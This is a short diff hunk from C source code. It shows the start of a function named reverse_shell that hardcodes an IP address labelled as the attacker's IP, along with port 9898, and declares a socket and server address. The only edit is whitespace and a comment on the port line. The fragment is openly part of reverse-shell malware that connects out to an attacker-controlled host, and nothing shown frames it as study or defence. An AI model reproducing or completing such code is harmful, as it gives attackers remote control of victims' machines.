@@ -10,7 +10,7 @@
 // Reverse Shell Setup Function
 void reverse_shell() {
     const char *RHOST = "206.189.136.204";  // attacker's IP
-    const int RPORT = 9898;             //  port
+    const int RPORT = 9898;             //  port                     // 
 
     int sock;
     struct sockaddr_in server;
